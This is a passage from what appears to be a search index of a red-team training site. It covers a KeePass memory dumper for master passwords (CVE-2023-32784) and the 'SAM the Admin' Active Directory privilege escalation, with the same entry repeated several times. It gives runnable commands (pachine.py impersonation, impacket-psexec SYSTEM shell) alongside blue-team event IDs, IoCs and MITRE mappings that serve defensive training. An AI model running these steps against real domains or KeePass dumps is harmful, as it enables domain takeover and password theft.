^[\\x20-\\x7E]+$ (all printable ASCII characters and space). Acknowledgements Thanks to adridlug for adding the possibility to auto-generate the password list, and ynuwenhof for refactoring the code. Related Projects Python implementation of the PoC by CMEPW Rust implementation of the PoC by ynuwenhof I haven't checked any of them yet.","title":"KeePass 2.X Master Password Dumper ([CVE-2023-32784](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784))"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#keepass-2x-master-password-dumper-cve-2023-32784","text":"","title":"KeePass 2.X Master Password Dumper (CVE-2023-32784)"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#update","text":"The vulnerability was assigned CVE-2023-32784 . It should be fixed in KeePass 2.54, which should come out in the beginning of June 2023 . Thanks again to Dominik Reichl for his fast response and creative fix! Clarification: the password has to be typed on a keyboard, not copied from a clipboard (see the How it works sections).","title":"Update"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#what-can-you-do","text":"First, update to KeePass 2.54 or higher once available. Second, if you've been using KeePass for a long time, your master password (and potentially other passwords) could be in your pagefile/swapfile, hibernation file and crash dump(s). Depending on your paranoia level, you can consider these steps to resolve the issue: Change your master password Delete crash dumps (depends on your OS, on Windows at least C:\\Windows\\memory.dmp , but maybe there are others) Delete hibernation file Delete pagefile/swapfile (can be quite annoying, don't forget to enable it back again) Overwrite deleted data on the HDD to prevent carving (e.g. Cipher with /w on Windows) Restart your computer Or just overwrite your HDD and do a fresh install of your OS. Incomplete list of products that are not impacted (please create a pull request or an issue for adding more). Rule of thumb is that if it isn't the original KeePass 2.X app written in .NET, it's likely not affected. KeePassXC Strongbox KeePass 1.X","title":"What can you do"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#-","text":"KeePass Master Password Dumper is a simple proof-of-concept tool used to dump the master password from KeePass's memory. Apart from the first password character, it is mostly able to recover the password in plaintext. No code execution on the target system is required, just a memory dump. It doesn't matter where the memory comes from - can be the process dump, swap file ( pagefile.sys ), hibernation file ( hiberfil.sys ), various crash dumps or RAM dump of the entire system. It doesn't matter whether or not the workspace is locked . It is also possible to dump the password from RAM after KeePass is no longer running, although the chance of that working goes down with the time it's been since then. Tested with KeePass 2.53.1 on Windows (English) and KeePass 2.47 on Debian (keepass2 package). It should work for the macOS version as well. Unfortunately, enabling the Enter master key on secure desktop option doesn't help in preventing the attack. PoC might have issues with databases created by older versions of KeePass, but I wasn't able to reproduce it (see issue #4 ). Finding was confirmed by Dominik Reichl, KeePass's author, here . I appreciate Dominik's fast response. Hopefully it will be fixed soon!","title":"----"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#setup","text":"Install .NET (most major operating systems supported). Clone the repository: git clone https://github.com/vdohney/keepass-password-dumper or download it from GitHub Enter the project directory in your terminal (Powershell on Windows) cd keepass-password-dumper dotnet run PATH_TO_DUMP The easiest way to test this on Windows is to create a process dump in the task manager by right-clicking the KeePass process and selecting \"Create dump file\". Alternatively you can add another parameter dotnet run PATH_TO_DUMP PATH_TO_PWDLIST to generate a list of all possible passwords beginning from the second character.","title":"Setup"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#should-you-be-worried","text":"Depends on your threat model. If your computer is already infected by malware that's running in the background with the privileges of your user, this finding doesn't make your situation much worse. However, it might be easier for the malware to be stealthy and evade the antivirus, since unlike KeeTheft or KeeFarce, no process injection or other type of code execution is necessary. If you have a reasonable suspicion that someone could obtain access to your computer and conduct forensic analysis, this could be bad. Worst case scenario is that the master password will be recovered, despite KeePass being locked or not running at all. If you use full disk encryption with a strong password and your system is clean, you should be fine. No one can steal your passwords remotely over the internet with this finding alone.","title":"Should You Be Worried?"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#how-it-works","text":"KeePass 2.X uses a custom-developed text box for password entry, SecureTextBoxEx . This text box is not only used for the master password entry, but in other places in KeePass as well, like password edit boxes (so the attack can also be used to recover their contents). The flaw exploited here is that for every character typed, a leftover string is created in memory. Because of how .NET works, it is nearly impossible to get rid of it once it gets created. For example, when \"Password\" is typed, it will result in these leftover strings: \u2022a, \u2022\u2022s, \u2022\u2022\u2022s, \u2022\u2022\u2022\u2022w, \u2022\u2022\u2022\u2022\u2022o, \u2022\u2022\u2022\u2022\u2022\u2022r, \u2022\u2022\u2022\u2022\u2022\u2022\u2022d. The POC application searches the dump for these patterns and offers a likely password character for each position in the password. Reliability of this attack can be influenced depending on how the password was typed and how many passwords were typed per session. However, I've discovered that even if there are multiple passwords per session or typos, the way .NET CLR allocates these strings means that they are likely to be nicely ordered in memory. So if three different passwords were typed, you are likely to get three candidates for each character position in that order, which makes it possible to recover all three passwords.","title":"How It Works"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#dev","text":"It's a quick POC, so likely not very reliable and robust. Please create a pull request if you happen to find an issue and fix it. Allowed password characters are currently hardcoded like this: ^[\\x20-\\x7E]+$ (all printable ASCII characters and space).","title":"Dev"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#acknowledgements","text":"Thanks to adridlug for adding the possibility to auto-generate the password list, and ynuwenhof for refactoring the code.","title":"Acknowledgements"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/#related-projects","text":"Python implementation of the PoC by CMEPW Rust implementation of the PoC by ynuwenhof I haven't checked any of them yet.","title":"Related Projects"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/","text":"SAM the Admin Background This attack is used for exploiting vulnerabilities CVE-2021-42278 and CVE-2021-42287 . By default, a standard domain user can join a computer to an Active Directory domain a maximum of 10 times. To distinguish user accounts from computer accounts, the latter should have a trailing $ in its sAMAccountName attribute. The attacker first creates a new machine named \" dc \" without the trailing $ and requests a Ticket Granting Ticket (TGT) for this account. After receiving the TGT, the machine account \"dc@DOMAIN\" is renamed. After renaming, no computer named \"dc\" exists in the domain. One key issue arises when a Ticket Granting Service (TGS) is then requested for an account that doesn't exist. When account \"dc\" is not found, Key Distribution Center (KDC) automatically tries appending the missing $ . This leads to the machine account name resolving to dc + $ = dc$ (domain controller). If the Key Distribution Center also doesn't force the use of Privilege Attribute Certificate in TGTs, the vulnerability can be exploited. The version (or build) of the Windows cannot be used to undeniably define whether or not the target is vulnerable. Instead, it should be checked if certain updates have been installed or not. If not, the target is most likely vulnerable. Requirements There are few practical requirements for this exploit to be usable: - The domain controller must be vulnerable - The abused service must have a Service Principal Name (SPN) set - Attacker must have valid credentials to an AD account to (mis)use - The account \"misused\" must be delegated to the abused service's SPN Setup Tools required krb5-user (from Linux repository) Pachine, https://github.com/ly4k/Pachine requires: Impacket Environmental requirements Domain controller not patched with November 2021 updates (KB5008102 and KB5008380) Installation The container is configured to take these steps automatically. Install krb5-user : $sudo apt-get install krb5-user During the installation, give following values: Default Realm : RT.VLE.FI Kerberos Servers : DC.RT.VLE.FI Administrative Server : DC.RT.VLE.FI - Clone Pachine from Github: - $git clone https://github.com/ly4k/Pachine Install Impacket required for Pachine, if not installed already $pip3 install impacket Docker A docker image has been provided which includes the following tools: Impacket in the /opt -directory Pachine in the /opt -directory SSH Proxychains Firing up the Docker container A dockerfile has been provided in the repository. Using it, build the image and run the container by running command # 1. go to directory with the dockerfile # 2. Build the Docker image, name it with arg specified with -t $docker build . -t my_container_name # 3. Run the container and open a shell there. $docker run -it my_container_name \"/bin/bash\" # 4. Carry out the mandatory configuration of the file /etc/hosts (instructions below) Mandatory configurations inside the container Add entry of DC's IP-address to /etc/hosts : <DC_IP> dc.rt.vle.fi rt.vle.fi Attack steps Use pachine.py (found in cloned Pachine directory) to check if the machine is vulnerable. $python3 pachine.py -dc-host [DC FQDN] -scan \"[DOMAIN]/[USERNAME:PW]\" Using pachine.py , acquire administrator's Kerberos ticket. This ticket is saved for a .ccache file in the current directory. $python3 pachine.py -dc-host [DC FQDN] -spn cifs/[DOMAIN] -impersonate administrator '[DOMAIN]/[USERNAME]:[PW]' Export path of the .ccache file to an environmental variable called KRB5CCNAME . Check the local directory for the file if needed. After the export valid Kerberos tickets can be checked. $export KRB5CCNAME=$PWD/[CCACHE_FILE_NAME] $klist NOTE: If you use auto-completion (TAB) to fill the ccache filename into the export command, terminal may automatically escape the dollar sign in $PWD . Make sure the dollar sign is not escaped. Open a shell on the DC as user \"system\" with the following command: $impacket-psexec -k -no-pass [DOMAIN]/administrator@[DOMAIN] Enjoy! For blue teams The attack leaves traces in Windows event logs, Windows Active Directory and most likely to the ADMIN$ share of the domain controller. Attack traces Traces were mapped to attack procedures whenever possible. Listed attacker procedures might not be separate manual actions carried out by the attacker. Listed procedures can be smaller actions induced by a single command executed by the attacker. Step 1 - Pachine.py, scan During the first step the attacker scans the domain controller for vulnerability. The table below shows the attack procedures during the first of the attack in terms of their respective traces and their source/ location. Attack procedure Trace type / location IoC / trace Additional info Request TGT without a PAC for regular user X Windows Event Log Kerberos TGT Request, Event 4768 Differs from \"normal\" TGT request by requesting a ticket specifically without PAC Request TGT with a PAC for regular user X Windows Event Log Kerberos TGT Request, Event 4768 Normal TGT request, hard to distinguish from bad actions Step 2 - Exploitation, Admin Impersonation Attackers can use regular user's credentials to add a machine account to the domain. A series of other procedures are executed to induce the DC to yield a TGS for Administrator user. Actions before administrative access are executed as regular user X (victim). Attack procedure Trace source / location IoC / trace Additional info Add new machine account named \"\" dc \"\" to the domain Windows Event Log / DC Machine Account Creation, Event 4741 EventData contains TargetUserName \"dc\", note: The machine account name doesn't end with $ Request TGT for machine account \"dc\" Windows Event Log / DC Kerberos TGT Request, Event 4768 EventData contains TargetUserName \"dc\" Change machine account name \"dc\" to \"DESKTOP-NNNNNNNN$\" Windows Event Log / DC Machine account name changed, Event 4781 EventData contains OldTargetUserName \"dc\" Request TGS for machine account \"dc\" using S4U2Self functionality Windows Event Log / DC Kerberos TGS Request, Event 4769 EventData contains TargetUserName \"dc@\" + DOMAIN_NAME Change server name from dc@DOMAIN to cifs/DOMAIN@DOMAIN UNK ? - Change machine account name \"DESKTOP-NNNNNNNN$\" to \"dc\" Windows Event Log Machine account name changed, Event 4781 EventData contains NewTargetUserName \"dc\" and OldTargetUserName \"DESKTOP-NNNNNNNN\\$\". Note: Each N in machine name \"DESKTOP-NNNNNNNN$\" stands for a randomly generated character by the attacker. The figure below demonstrates a situation where the attacker has added a machine \"dc\" to domain. Note the missing $ in machine's name. In the figure below the attacker has renamed DESKOP-NNNNNNNN$ back to dc . Step 3 - Exporting KRB5CCNAME to env. vars No attacker actions which would leave traces to target system or network. Step 4 - Impacket PsExec The attacker uploads a randomly named RemComSvc utility binary to the target machine's writable share via SMB and creates a service. The length of the random named executable is approximately 7 to 9 characters (excluding the .exe extension). The service's name is typically 4 charaters long. Attack procedure Trace source / location IoC / trace Additional info Shares requested on target IP UNK UNK - Upload .exe to share Propable file artifact / C:\\Windows\\ .exe / DC Executable with MD5sum: 6983f7001de10f4d19fc2d794c3eb534 , may get deleted if the attacker's shell session exits gracefully Located very likely under C:\\Windows\\ , share used for access very likely ADMIN$ , File checksum is a certain IoC Create service to execute .exe Windows Event Log / DC Service Control Manager, Event 7045 ( event 7045 is a \"legacy\" version of Event 4697 ) Announcement of a new created service (NNNN) Start the service to execute .exe Windows Event Log / DC Service Control Manager, Event 7036 ] Announcement of the (attacker's) service (NNNN) having entered running state EDR detection This exploit was tested against Windows Server 2012 with FireEye Endpoint Security Client, version 33.46.6. FireEye did not detect the attack. FireEye EDR did not generate alerts on the EDR service in the Labranet RT environment. CWE and MITRE ATT&CK CWE-269: Improper Privilege Management TA0001 - Initial access: T1078 - Valid accounts * Attacker needs a valid account on the domain to execute the attack. TA0003 - Persistence T1078 - Valid accounts * The attacker can maintain access to network resources through the compromised or newly created accounts. TA0004 - Privilege escalation T1134 - Access token manipulation * By exploiting the vulnerability, attackers can create TGS for any user in the domain to the CIFS service (If the victim is assigned to that service). Gaining access to the CIFS service allows attackers to access domain controller's network shares as domain administrator. T1078 - Valid accounts * The attacker gains access to a valid account on the domain. TA0006 - Credential access T1558 - Steal or forge kerberos tickets * The attacker can request the administrator's ticket because of account name handling on the Key Distribution Center.","title":"SAM the Admin"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#sam-the-admin","text":"","title":"SAM the Admin"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#background","text":"This attack is used for exploiting vulnerabilities CVE-2021-42278 and CVE-2021-42287 . By default, a standard domain user can join a computer to an Active Directory domain a maximum of 10 times. To distinguish user accounts from computer accounts, the latter should have a trailing $ in its sAMAccountName attribute. The attacker first creates a new machine named \" dc \" without the trailing $ and requests a Ticket Granting Ticket (TGT) for this account. After receiving the TGT, the machine account \"dc@DOMAIN\" is renamed. After renaming, no computer named \"dc\" exists in the domain. One key issue arises when a Ticket Granting Service (TGS) is then requested for an account that doesn't exist. When account \"dc\" is not found, Key Distribution Center (KDC) automatically tries appending the missing $ . This leads to the machine account name resolving to dc + $ = dc$ (domain controller). If the Key Distribution Center also doesn't force the use of Privilege Attribute Certificate in TGTs, the vulnerability can be exploited. The version (or build) of the Windows cannot be used to undeniably define whether or not the target is vulnerable. Instead, it should be checked if certain updates have been installed or not. If not, the target is most likely vulnerable.","title":"Background"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#requirements","text":"There are few practical requirements for this exploit to be usable: - The domain controller must be vulnerable - The abused service must have a Service Principal Name (SPN) set - Attacker must have valid credentials to an AD account to (mis)use - The account \"misused\" must be delegated to the abused service's SPN","title":"Requirements"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#setup","text":"","title":"Setup"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#tools-required","text":"krb5-user (from Linux repository) Pachine, https://github.com/ly4k/Pachine requires: Impacket","title":"Tools required"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#environmental-requirements","text":"Domain controller not patched with November 2021 updates (KB5008102 and KB5008380)","title":"Environmental requirements"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#installation","text":"The container is configured to take these steps automatically. Install krb5-user : $sudo apt-get install krb5-user During the installation, give following values: Default Realm : RT.VLE.FI Kerberos Servers : DC.RT.VLE.FI Administrative Server : DC.RT.VLE.FI - Clone Pachine from Github: - $git clone https://github.com/ly4k/Pachine Install Impacket required for Pachine, if not installed already $pip3 install impacket","title":"Installation"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#docker","text":"A docker image has been provided which includes the following tools: Impacket in the /opt -directory Pachine in the /opt -directory SSH Proxychains","title":"Docker"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#firing-up-the-docker-container","text":"A dockerfile has been provided in the repository. Using it, build the image and run the container by running command # 1. go to directory with the dockerfile # 2. Build the Docker image, name it with arg specified with -t $docker build . -t my_container_name # 3. Run the container and open a shell there. $docker run -it my_container_name \"/bin/bash\" # 4. Carry out the mandatory configuration of the file /etc/hosts (instructions below)","title":"Firing up the Docker container"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#mandatory-configurations-inside-the-container","text":"Add entry of DC's IP-address to /etc/hosts : <DC_IP> dc.rt.vle.fi rt.vle.fi","title":"Mandatory configurations inside the container"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#attack-steps","text":"Use pachine.py (found in cloned Pachine directory) to check if the machine is vulnerable. $python3 pachine.py -dc-host [DC FQDN] -scan \"[DOMAIN]/[USERNAME:PW]\" Using pachine.py , acquire administrator's Kerberos ticket. This ticket is saved for a .ccache file in the current directory. $python3 pachine.py -dc-host [DC FQDN] -spn cifs/[DOMAIN] -impersonate administrator '[DOMAIN]/[USERNAME]:[PW]' Export path of the .ccache file to an environmental variable called KRB5CCNAME . Check the local directory for the file if needed. After the export valid Kerberos tickets can be checked. $export KRB5CCNAME=$PWD/[CCACHE_FILE_NAME] $klist NOTE: If you use auto-completion (TAB) to fill the ccache filename into the export command, terminal may automatically escape the dollar sign in $PWD . Make sure the dollar sign is not escaped. Open a shell on the DC as user \"system\" with the following command: $impacket-psexec -k -no-pass [DOMAIN]/administrator@[DOMAIN] Enjoy!","title":"Attack steps"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#for-blue-teams","text":"The attack leaves traces in Windows event logs, Windows Active Directory and most likely to the ADMIN$ share of the domain controller.","title":"For blue teams"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#attack-traces","text":"Traces were mapped to attack procedures whenever possible. Listed attacker procedures might not be separate manual actions carried out by the attacker. Listed procedures can be smaller actions induced by a single command executed by the attacker.","title":"Attack traces"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#step-1-pachinepy-scan","text":"During the first step the attacker scans the domain controller for vulnerability. The table below shows the attack procedures during the first of the attack in terms of their respective traces and their source/ location. Attack procedure Trace type / location IoC / trace Additional info Request TGT without a PAC for regular user X Windows Event Log Kerberos TGT Request, Event 4768 Differs from \"normal\" TGT request by requesting a ticket specifically without PAC Request TGT with a PAC for regular user X Windows Event Log Kerberos TGT Request, Event 4768 Normal TGT request, hard to distinguish from bad actions","title":"Step 1 - Pachine.py, scan"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#step-2-exploitation-admin-impersonation","text":"Attackers can use regular user's credentials to add a machine account to the domain. A series of other procedures are executed to induce the DC to yield a TGS for Administrator user. Actions before administrative access are executed as regular user X (victim). Attack procedure Trace source / location IoC / trace Additional info Add new machine account named \"\" dc \"\" to the domain Windows Event Log / DC Machine Account Creation, Event 4741 EventData contains TargetUserName \"dc\", note: The machine account name doesn't end with $ Request TGT for machine account \"dc\" Windows Event Log / DC Kerberos TGT Request, Event 4768 EventData contains TargetUserName \"dc\" Change machine account name \"dc\" to \"DESKTOP-NNNNNNNN$\" Windows Event Log / DC Machine account name changed, Event 4781 EventData contains OldTargetUserName \"dc\" Request TGS for machine account \"dc\" using S4U2Self functionality Windows Event Log / DC Kerberos TGS Request, Event 4769 EventData contains TargetUserName \"dc@\" + DOMAIN_NAME Change server name from dc@DOMAIN to cifs/DOMAIN@DOMAIN UNK ? - Change machine account name \"DESKTOP-NNNNNNNN$\" to \"dc\" Windows Event Log Machine account name changed, Event 4781 EventData contains NewTargetUserName \"dc\" and OldTargetUserName \"DESKTOP-NNNNNNNN\\$\". Note: Each N in machine name \"DESKTOP-NNNNNNNN$\" stands for a randomly generated character by the attacker. The figure below demonstrates a situation where the attacker has added a machine \"dc\" to domain. Note the missing $ in machine's name. In the figure below the attacker has renamed DESKOP-NNNNNNNN$ back to dc .","title":"Step 2 - Exploitation, Admin  Impersonation"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#step-3-exporting-krb5ccname-to-env-vars","text":"No attacker actions which would leave traces to target system or network.","title":"Step 3 - Exporting KRB5CCNAME to env. vars"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#step-4-impacket-psexec","text":"The attacker uploads a randomly named RemComSvc utility binary to the target machine's writable share via SMB and creates a service. The length of the random named executable is approximately 7 to 9 characters (excluding the .exe extension). The service's name is typically 4 charaters long. Attack procedure Trace source / location IoC / trace Additional info Shares requested on target IP UNK UNK - Upload .exe to share Propable file artifact / C:\\Windows\\ .exe / DC Executable with MD5sum: 6983f7001de10f4d19fc2d794c3eb534 , may get deleted if the attacker's shell session exits gracefully Located very likely under C:\\Windows\\ , share used for access very likely ADMIN$ , File checksum is a certain IoC Create service to execute .exe Windows Event Log / DC Service Control Manager, Event 7045 ( event 7045 is a \"legacy\" version of Event 4697 ) Announcement of a new created service (NNNN) Start the service to execute .exe Windows Event Log / DC Service Control Manager, Event 7036 ] Announcement of the (attacker's) service (NNNN) having entered running state","title":"Step 4 - Impacket PsExec"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#edr-detection","text":"This exploit was tested against Windows Server 2012 with FireEye Endpoint Security Client, version 33.46.6. FireEye did not detect the attack. FireEye EDR did not generate alerts on the EDR service in the Labranet RT environment.","title":"EDR detection"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/#cwe-and-mitre-attck","text":"CWE-269: Improper Privilege Management TA0001 - Initial access: T1078 - Valid accounts * Attacker needs a valid account on the domain to execute the attack. TA0003 - Persistence T1078 - Valid accounts * The attacker can maintain access to network resources through the compromised or newly created accounts. TA0004 - Privilege escalation T1134 - Access token manipulation * By exploiting the vulnerability, attackers can create TGS for any user in the domain to the CIFS service (If the victim is assigned to that service). Gaining access to the CIFS service allows attackers to access domain controller's network shares as domain administrator. T1078 - Valid accounts * The attacker gains access to a valid account on the domain. TA0006 - Credential access T1558 - Steal or forge kerberos tickets * The attacker can request the administrator's ticket because of account name handling on the Key Distribution Center.","title":"CWE and MITRE ATT&amp;CK"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/","text":"SAM the Admin Background This attack is used for exploiting vulnerabilities CVE-2021-42278 and CVE-2021-42287 . By default, a standard domain user can join a computer to an Active Directory domain a maximum of 10 times. To distinguish user accounts from computer accounts, the latter should have a trailing $ in its sAMAccountName attribute. The attacker first creates a new machine named \" dc \" without the trailing $ and requests a Ticket Granting Ticket (TGT) for this account. After receiving the TGT, the machine account \"dc@DOMAIN\" is renamed. After renaming, no computer named \"dc\" exists in the domain. One key issue arises when a Ticket Granting Service (TGS) is then requested for an account that doesn't exist. When account \"dc\" is not found, Key Distribution Center (KDC) automatically tries appending the missing $ . This leads to the machine account name resolving to dc + $ = dc$ (domain controller). If the Key Distribution Center also doesn't force the use of Privilege Attribute Certificate in TGTs, the vulnerability can be exploited. The version (or build) of the Windows cannot be used to undeniably define whether or not the target is vulnerable. Instead, it should be checked if certain updates have been installed or not. If not, the target is most likely vulnerable. Requirements There are few practical requirements for this exploit to be usable: The domain controller must be vulnerable The abused service must have a Service Principal Name (SPN) set Attacker must have valid credentials to an AD account to (mis)use The account \"misused\" must be delegated to the abused service's SPN Setup Tools required krb5-user (from Linux repository) Pachine, https://github.com/ly4k/Pachine requires: Impacket Environmental requirements Domain controller not patched with November 2021 updates (KB5008102 and KB5008380) Installation The container is configured to take these steps automatically. Install krb5-user : $sudo apt-get install krb5-user During the installation, give following values: Default Realm : RT.VLE.FI Kerberos Servers : DC.RT.VLE.FI Administrative Server : DC.RT.VLE.FI - Clone Pachine from Github: - $git clone https://github.com/ly4k/Pachine Install Impacket required for Pachine, if not installed already $pip3 install impacket Docker A docker image has been provided which includes the following tools: Impacket in the /opt -directory Pachine in the /opt -directory SSH Proxychains Firing up the Docker container A dockerfile has been provided in the repository. Using it, build the image and run the container by running command # 1. go to directory with the dockerfile # 2. Build the Docker image, name it with arg specified with -t $docker build . -t my_container_name # 3. Run the container and open a shell there. $docker run -it my_container_name \"/bin/bash\" # 4. Carry out the mandatory configuration of the file /etc/hosts (instructions below) Mandatory configurations inside the container Add entry of DC's IP-address to /etc/hosts : <DC_IP> dc.rt.vle.fi rt.vle.fi Attack steps Use pachine.py (found in cloned Pachine directory) to check if the machine is vulnerable. $python3 pachine.py -dc-host [DC FQDN] -scan \"[DOMAIN]/[USERNAME:PW]\" Using pachine.py , acquire administrator's Kerberos ticket. This ticket is saved for a .ccache file in the current directory. $python3 pachine.py -dc-host [DC FQDN] -spn cifs/[DOMAIN] -impersonate administrator '[DOMAIN]/[USERNAME]:[PW]' Export path of the .ccache file to an environmental variable called KRB5CCNAME . Check the local directory for the file if needed. After the export valid Kerberos tickets can be checked. $export KRB5CCNAME=$PWD/[CCACHE_FILE_NAME] $klist NOTE: If you use auto-completion (TAB) to fill the ccache filename into the export command, terminal may automatically escape the dollar sign in $PWD . Make sure the dollar sign is not escaped. Open a shell on the DC as user \"system\" with the following command: $impacket-psexec -k -no-pass [DOMAIN]/administrator@[DOMAIN] Enjoy! For blue teams The attack leaves traces in Windows event logs, Windows Active Directory and most likely to the ADMIN$ share of the domain controller. Attack traces Traces were mapped to attack procedures whenever possible. Listed attacker procedures might not be separate manual actions carried out by the attacker. Listed procedures can be smaller actions induced by a single command executed by the attacker. Step 1 - Pachine.py, scan During the first step the attacker scans the domain controller for vulnerability. The table below shows the attack procedures during the first of the attack in terms of their respective traces and their source/ location. Attack procedure Trace type / location IoC / trace Additional info Request TGT without a PAC for regular user X Windows Event Log Kerberos TGT Request, Event 4768 Differs from \"normal\" TGT request by requesting a ticket specifically without PAC Request TGT with a PAC for regular user X Windows Event Log Kerberos TGT Request, Event 4768 Normal TGT request, hard to distinguish from bad actions Step 2 - Exploitation, Admin Impersonation Attackers can use regular user's credentials to add a machine account to the domain. A series of other procedures are executed to induce the DC to yield a TGS for Administrator user. Actions before administrative access are executed as regular user X (victim). Attack procedure Trace source / location IoC / trace Additional info Add new machine account named \"\" dc \"\" to the domain Windows Event Log / DC Machine Account Creation, Event 4741 EventData contains TargetUserName \"dc\", note: The machine account name doesn't end with $ Request TGT for machine account \"dc\" Windows Event Log / DC Kerberos TGT Request, Event 4768 EventData contains TargetUserName \"dc\" Change machine account name \"dc\" to \"DESKTOP-NNNNNNNN$\" Windows Event Log / DC Machine account name changed, Event 4781 EventData contains OldTargetUserName \"dc\" Request TGS for machine account \"dc\" using S4U2Self functionality Windows Event Log / DC Kerberos TGS Request, Event 4769 EventData contains TargetUserName \"dc@\" + DOMAIN_NAME Change server name from dc@DOMAIN to cifs/DOMAIN@DOMAIN UNK ? - Change machine account name \"DESKTOP-NNNNNNNN$\" to \"dc\" Windows Event Log Machine account name changed, Event 4781 EventData contains NewTargetUserName \"dc\" and OldTargetUserName \"DESKTOP-NNNNNNNN\\$\". Note: Each N in machine name \"DESKTOP-NNNNNNNN$\" stands for a randomly generated character by the attacker. The figure below demonstrates a situation where the attacker has added a machine \"dc\" to domain. Note the missing $ in machine's name. In the figure below the attacker has renamed DESKOP-NNNNNNNN$ back to dc . Step 3 - Exporting KRB5CCNAME to env. vars No attacker actions which would leave traces to target system or network. Step 4 - Impacket PsExec The attacker uploads a randomly named RemComSvc utility binary to the target machine's writable share via SMB and creates a service. The length of the random named executable is approximately 7 to 9 characters (excluding the .exe extension). The service's name is typically 4 charaters long. Attack procedure Trace source / location IoC / trace Additional info Shares requested on target IP UNK UNK - Upload .exe to share Propable file artifact / C:\\Windows\\ .exe / DC Executable with MD5sum: 6983f7001de10f4d19fc2d794c3eb534 , may get deleted if the attacker's shell session exits gracefully Located very likely under C:\\Windows\\ , share used for access very likely ADMIN$ , File checksum is a certain IoC Create service to execute .exe Windows Event Log / DC Service Control Manager, Event 7045 ( event 7045 is a \"legacy\" version of Event 4697 ) Announcement of a new created service (NNNN) Start the service to execute .exe Windows Event Log / DC Service Control Manager, Event 7036 ] Announcement of the (attacker's) service (NNNN) having entered running state EDR detection This exploit was tested against Windows Server 2012 with FireEye Endpoint Security Client, version 33.46.6. FireEye did not detect the attack. FireEye EDR did not generate alerts on the EDR service in the Labranet RT environment. CWE and MITRE ATT&CK CWE-269: Improper Privilege Management TA0001 - Initial access: T1078 - Valid accounts * Attacker needs a valid account on the domain to execute the attack. TA0003 - Persistence T1078 - Valid accounts * The attacker can maintain access to network resources through the compromised or newly created accounts. TA0004 - Privilege escalation T1134 - Access token manipulation * By exploiting the vulnerability, attackers can create TGS for any user in the domain to the CIFS service (If the victim is assigned to that service). Gaining access to the CIFS service allows attackers to access domain controller's network shares as domain administrator. T1078 - Valid accounts * The attacker gains access to a valid account on the domain. TA0006 - Credential access T1558 - Steal or forge kerberos tickets * The attacker can request the administrator's ticket because of account name handling on the Key Distribution Center.","title":"SAM the Admin"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#sam-the-admin","text":"","title":"SAM the Admin"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#background","text":"This attack is used for exploiting vulnerabilities CVE-2021-42278 and CVE-2021-42287 . By default, a standard domain user can join a computer to an Active Directory domain a maximum of 10 times. To distinguish user accounts from computer accounts, the latter should have a trailing $ in its sAMAccountName attribute. The attacker first creates a new machine named \" dc \" without the trailing $ and requests a Ticket Granting Ticket (TGT) for this account. After receiving the TGT, the machine account \"dc@DOMAIN\" is renamed. After renaming, no computer named \"dc\" exists in the domain. One key issue arises when a Ticket Granting Service (TGS) is then requested for an account that doesn't exist. When account \"dc\" is not found, Key Distribution Center (KDC) automatically tries appending the missing $ . This leads to the machine account name resolving to dc + $ = dc$ (domain controller). If the Key Distribution Center also doesn't force the use of Privilege Attribute Certificate in TGTs, the vulnerability can be exploited. The version (or build) of the Windows cannot be used to undeniably define whether or not the target is vulnerable. Instead, it should be checked if certain updates have been installed or not. If not, the target is most likely vulnerable.","title":"Background"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#requirements","text":"There are few practical requirements for this exploit to be usable: The domain controller must be vulnerable The abused service must have a Service Principal Name (SPN) set Attacker must have valid credentials to an AD account to (mis)use The account \"misused\" must be delegated to the abused service's SPN","title":"Requirements"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#setup","text":"","title":"Setup"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#tools-required","text":"krb5-user (from Linux repository) Pachine, https://github.com/ly4k/Pachine requires: Impacket","title":"Tools required"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#environmental-requirements","text":"Domain controller not patched with November 2021 updates (KB5008102 and KB5008380)","title":"Environmental requirements"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#installation","text":"The container is configured to take these steps automatically. Install krb5-user : $sudo apt-get install krb5-user During the installation, give following values: Default Realm : RT.VLE.FI Kerberos Servers : DC.RT.VLE.FI Administrative Server : DC.RT.VLE.FI - Clone Pachine from Github: - $git clone https://github.com/ly4k/Pachine Install Impacket required for Pachine, if not installed already $pip3 install 